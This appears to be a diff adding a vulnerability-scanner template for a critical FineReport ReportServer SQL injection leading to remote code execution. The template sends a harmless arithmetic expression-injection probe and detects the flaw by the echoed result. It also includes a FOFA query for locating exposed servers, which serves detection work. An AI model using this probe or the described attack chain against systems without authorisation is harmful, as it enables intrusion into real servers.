@@ -1,0 +1,35 @@
+id: fanruan-reportserver-sqlite-rce
+
+info:
+  name: FineReport /view/ReportServer SQL Injection to RCE
+  author: Co5mos
+  severity: critical
+  description: |
+    帆软 FineReport /view/ReportServer 接口存在sqlite注入，攻击者能够利用该漏洞执行attach database写入jsp文件执行系统命令。
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E5%B8%86%E8%BD%AF%E7%B3%BB%E7%BB%9FReportServer%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4RCE.md
+  metadata:
+    verified: true
+    fofa-query: 'app="FineReport"'
+  tags: finereport, sqli, rce
+
+variables:
+  num1: "{{rand_int(100, 200)}}"
+  num2: "{{rand_int(100, 200)}}"
+  expression: "{{num1}}*{{num2}}"
+  prefix: "${"
+  suffix: "}"
+  result: "{{to_number(num1)*to_number(num2)}}"
+
+http:
+  - raw:
+      - |
+        GET /webroot/decision/view/ReportServer?test=&n={{prefix}}{{expression}}{{suffix}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 302
+          - regex('Location:.*{{result}}', header)
+        condition: and
